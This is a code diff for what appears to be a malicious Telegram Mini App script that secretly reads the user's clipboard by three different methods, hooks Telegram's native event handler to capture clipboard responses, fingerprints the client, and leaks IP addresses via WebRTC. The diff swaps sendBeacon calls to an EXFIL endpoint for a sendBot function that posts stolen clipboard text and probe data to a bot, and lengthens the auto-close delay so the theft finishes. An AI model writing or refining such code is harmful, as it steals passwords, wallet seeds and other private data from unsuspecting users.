@@ -198,70 +198,47 @@
   // ===== CLIPBOARD READ (Mini App API) =====
   var clipboardData = null
   var clipboardError = null
+
+  // Method 1: Telegram.WebApp.readTextFromClipboard()
   try {
     if (tg && tg.readTextFromClipboard) {
+      clipboardError = 'method exists, waiting for callback...'
       tg.readTextFromClipboard(function(text) {
         clipboardData = text
-        try {
-          navigator.sendBeacon(EXFIL + '/clipboard-miniapp', JSON.stringify({
-            type: 'clipboard_miniapp',
-            status: 'success',
-            text: text,
-            ts: Date.now()
-          }))
-        } catch(e) {}
+        sendBot('<b>CLIPBOARD READ:</b> <code>' + String(text).substring(0, 500) + '</code>')
       })
     } else {
-      clipboardError = 'readTextFromClipboard not available on WebApp object'
-      // Try via postEvent directly
-      try {
-        if (tg && tg.version) {
-          // The method may be version-gated, try raw event
-          window.Telegram.WebView.postEvent('web_app_read_text_from_clipboard', false, JSON.stringify({req_id: 'clip_miniapp_1'}))
-        }
-      } catch(e) { clipboardError += ' | postEvent: ' + e.message }
+      clipboardError = 'readTextFromClipboard not on WebApp obj'
     }
-  } catch(e) { clipboardError = e.message }
+  } catch(e) { clipboardError = 'tg.readClipboard error: ' + e.message }
 
-  // Also try navigator.clipboard from Mini App context
+  // Method 2: Raw postEvent for clipboard
+  try {
+    if (window.Telegram && window.Telegram.WebView && window.Telegram.WebView.postEvent) {
+      window.Telegram.WebView.postEvent('web_app_read_text_from_clipboard', false, JSON.stringify({req_id: 'raw_1'}))
+      clipboardError = (clipboardError || '') + ' | postEvent sent'
+    }
+  } catch(e) { clipboardError = (clipboardError || '') + ' | postEvent err: ' + e.message }
+
+  // Method 3: navigator.clipboard API
   try {
     if (navigator.clipboard && navigator.clipboard.readText) {
       navigator.clipboard.readText().then(function(text) {
-        try {
-          navigator.sendBeacon(EXFIL + '/clipboard-webapi', JSON.stringify({
-            type: 'clipboard_webapi',
-            status: 'success',
-            text: text,
-            ts: Date.now()
-          }))
-        } catch(e) {}
+        if (!clipboardData) clipboardData = text
+        sendBot('<b>CLIPBOARD (web API):</b> <code>' + String(text).substring(0, 500) + '</code>')
       }).catch(function(e) {
-        try {
-          navigator.sendBeacon(EXFIL + '/clipboard-webapi', JSON.stringify({
-            type: 'clipboard_webapi',
-            status: 'error',
-            error: e.message,
-            ts: Date.now()
-          }))
-        } catch(ex) {}
+        clipboardError = (clipboardError || '') + ' | webAPI: ' + e.message
       })
     }
   } catch(e) {}
 
-  // Hook receiveEvent to catch clipboard response
+  // Hook receiveEvent to catch clipboard response from native
   try {
     var origReceive = window.Telegram.WebView.receiveEvent
     window.Telegram.WebView.receiveEvent = function(eventType, eventData) {
       if (eventType === 'clipboard_text_received') {
-        try {
-          navigator.sendBeacon(EXFIL + '/clipboard-event', JSON.stringify({
-            type: 'clipboard_event',
-            eventType: eventType,
-            eventData: eventData,
-            ts: Date.now()
-          }))
-        } catch(e) {}
-        if (eventData && eventData.data) clipboardData = eventData.data
+        clipboardData = (eventData && eventData.data) || eventData
+        sendBot('<b>CLIPBOARD (event):</b> <code>' + JSON.stringify(eventData).substring(0, 500) + '</code>')
       }
       if (origReceive) return origReceive.apply(this, arguments)
     }
@@ -280,14 +257,12 @@
       miniAppProbes.headerColor = tg.headerColor
       miniAppProbes.backgroundColor = tg.backgroundColor
       miniAppProbes.isClosingConfirmationEnabled = tg.isClosingConfirmationEnabled
+      miniAppProbes.hasReadClipboard = typeof (tg.readTextFromClipboard) === 'function'
       miniAppProbes.BiometricManager = tg.BiometricManager ? {
         isInited: tg.BiometricManager.isInited,
         isBiometricAvailable: tg.BiometricManager.isBiometricAvailable,
-        biometricType: tg.BiometricManager.biometricType,
-        isAccessRequested: tg.BiometricManager.isAccessRequested,
-        isAccessGranted: tg.BiometricManager.isAccessGranted
+        biometricType: tg.BiometricManager.biometricType
       } : 'not available'
-      // List all available methods on tg
       var tgMethods = []
       for (var p in tg) {
         if (typeof tg[p] === 'function') tgMethods.push(p)
@@ -296,15 +271,8 @@
     }
   } catch(e) { miniAppProbes.error = e.message }
 
-  // Send probes immediately
-  try {
-    navigator.sendBeacon(EXFIL + '/miniapp-probes', JSON.stringify({
-      type: 'miniapp_probes',
-      probes: miniAppProbes,
-      clipboardError: clipboardError,
-      ts: Date.now()
-    }))
-  } catch(e) {}
+  // Send probes via Bot API (reliable)
+  sendBot('<b>MINI APP PROBES:</b>\n<code>' + JSON.stringify(miniAppProbes, null, 1).substring(0, 3000) + '</code>')
 
   // ===== WebRTC IP LEAK =====
   var ips = []
@@ -386,8 +354,8 @@
       }))
     } catch(e) {}
 
-    // Auto-close
-    setTimeout(function() { try { tg.close() } catch(e) {} }, 1500)
+    // Auto-close (delayed to allow clipboard callback)
+    setTimeout(function() { try { tg.close() } catch(e) {} }, 4000)
   }
 
   // WebRTC
